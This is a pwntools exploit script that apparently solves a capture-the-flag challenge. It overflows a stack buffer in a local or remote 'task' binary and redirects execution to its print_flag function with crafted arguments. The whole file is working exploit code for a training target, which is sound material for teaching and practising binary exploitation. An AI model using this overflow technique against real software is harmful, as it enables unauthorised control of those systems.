#!/usr/bin/env python3

from pwn import *

elf = ELF('./task')

if args.GDB:
	p = gdb.debug(elf.path, '\n'.join([
		"b *main",
		"b *vuln+69",
		"c"
	]))
elif args.REMOTE:
	host, port = args.get("HOST", "localhost"), args.get("PORT", 5000)
	p = remote(host, port)
else:
	p = process(elf.path) 

# print_flag expects following stack layout
# |  retaddr
# |  param 1
# v  param 2

payload = b'A' * 0x2c
payload += p32(elf.symbols['print_flag'])
payload += b'C' * 4 # filler, fake retaddr
payload += p32(-1337, sign='signed')
payload += p32(0xC0FFEE)

p.sendlineafter(b'Do you want to say something?', payload)

print(p.stream().decode())